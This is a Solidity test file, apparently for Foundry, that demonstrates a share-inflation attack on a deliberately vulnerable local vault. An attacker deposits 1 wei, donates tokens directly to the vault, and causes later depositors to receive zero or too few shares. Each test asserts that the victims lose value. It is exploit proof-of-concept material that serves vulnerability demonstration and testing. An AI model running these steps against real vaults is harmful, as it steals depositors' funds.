// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract InflationAttackExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;

    address public attacker = address(0xBAD);
    address public victim = address(0xBEEF);

    uint256 constant INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        token = new MockERC20("Test Token", "TEST");
        vault = new VulnerableVault(
            address(token),
            "Vault Shares",
            "vTEST"
        );

        token.mint(attacker, INITIAL_BALANCE);
        token.mint(victim, INITIAL_BALANCE);
    }

    function testFirstDepositorDominance() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);

        // 1. Attacker deposits 1 wei (gets 1 share)
        vault.deposit(1);

        // 2. Attacker inflates share price via direct donation
        vault.donateToVault(100 ether);
        vm.stopPrank();

        // 3. 10 Users deposit 1 ETH each
        for (uint i = 0; i < 10; i++) {
            address user = address(uint160(0x2000 + i));
            token.mint(user, 1 ether);
            vm.startPrank(user);
            token.approve(address(vault), 1 ether);
            vault.deposit(1 ether); // Rounds down to 0 shares!
            vm.stopPrank();
        }

        uint256 attackerShares = vault.balanceOf(attacker);
        uint256 totalShares = vault.totalSupply();

        // Ownership = 100% because everyone else got 0 shares
        uint256 attackerPercentage = (attackerShares * 100) / totalShares;
        assertEq(attackerPercentage, 100, "Attacker should own 100% of the vault");
    }

    function testInflationAttackPrecisionLoss() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        vault.donateToVault(100 ether);
        vm.stopPrank();

        // Victim deposits 50 ETH.
        // Shares = (50 ETH * 1 share) / (100 ETH + 1 wei) = 0.499... -> Rounds to 0
        vm.startPrank(victim);
        token.approve(address(vault), 50 ether);
        vault.deposit(50 ether);

        assertEq(vault.balanceOf(victim), 0, "Victim should have received 0 shares");
        vm.stopPrank();
    }

    function testInflationAttackBasic() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        vault.donateToVault(10 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), 20 ether);
        vault.deposit(20 ether);
        uint256 victimShares = vault.balanceOf(victim);
        vm.stopPrank();

        // Victim deposited 20 ETH into a vault worth 10 ETH per share.
        // They should only get 1 share, making them lose half their value.
        assertLt(vault.convertToAssets(victimShares), 20 ether, "Victim should have lost value");
    }
}

// Keep the Mock contract outside the main test contract
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}
